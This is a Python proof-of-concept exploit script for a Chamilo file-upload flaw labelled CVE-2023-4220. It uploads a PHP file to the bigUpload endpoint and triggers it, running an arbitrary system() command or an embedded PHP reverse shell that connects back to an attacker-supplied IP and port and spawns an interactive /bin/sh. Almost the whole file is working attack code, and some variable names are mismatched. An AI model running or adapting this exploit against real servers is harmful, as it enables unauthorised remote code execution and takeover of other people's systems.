import requests
import argparse
from io import BytesIO

def sendRevshell(url, filname, ip, port):
	revshell = '''
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = "''' + ip + '''"; 
$port = ''' + port + ''';
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);
// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

'''
# Content of the file you want to send
	file_content = bytes(revshell, 'utf-8')

	# Create a file-like object from the content
	file_like_object = BytesIO(file_content)

	# Define the files dictionary with the file-like object
	files = {
	    'bigUploadFile': (filename, file_like_object)
	}

	# Send the multipart form request
	response = requests.post(url, files=files)
	if response.status_code != 200:
		print("Error uploading revshell!")
		print(response.text)
		exit(1)

	#print(response.text)
	triggerExecution(filname)



def sendCommand(url, cmd, filname):
	cmd_str= f'<?php system("{cmd}"); ?>'

	# Content of the file you want to send
	file_content = bytes(cmd_str, 'utf-8')

	# Create a file-like object from the content
	file_like_object = BytesIO(file_content)

	# Define the files dictionary with the file-like object
	files = {
	    'bigUploadFile': (filename, file_like_object)
	}

	# Send the multipart form request
	response = requests.post(url, files=files)
	if response.status_code != 200:
		print("Error uploading file!")
		print(response.text)
		exit(1)

	triggerExecution(filename)

	#print(response.text)

def triggerExecution(filname):
	x = requests.get(f"{url}/main/inc/lib/javascript/bigupload/files/{filename}")
	if x.status_code != 200:
		print("Error reading file!")
		print(x.text)
		exit(1)

	print(x.text)




# main

# argparse

parser = argparse.ArgumentParser(description='Chamilio CVE-2023-4220 POC Exploit')

# Define the command-line arguments
parser.add_argument('url', type=str, help='The Chamilio Url. e.g. http://example.com')
parser.add_argument('-c', type=str, default="id",help='The command to execute. e.g. "id", default: id', required=False)
parser.add_argument('-f', type=str, default="test", help='The filename to name the uploaded file. default: test.php', required=False)
parser.add_argument('-r', action='store_const', help='if set, will uplaod php revshell', default=False)
parser.add_argument('-i', type=str, help='revshell attacker ip')
parser.add_argument('-p' , type=str, help='revshell attacker port')


# Parse the arguments
args = parser.parse_args()

url = args.url
cmd = args.c
filename = args.f
filename = f"{filename}.php"


full_url = f"{url}/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"

if args.r != False:
	sendRevshell(full_url, filename, args.i, args.p)

else: 
	sendCommand(full_url, cmd, filename)

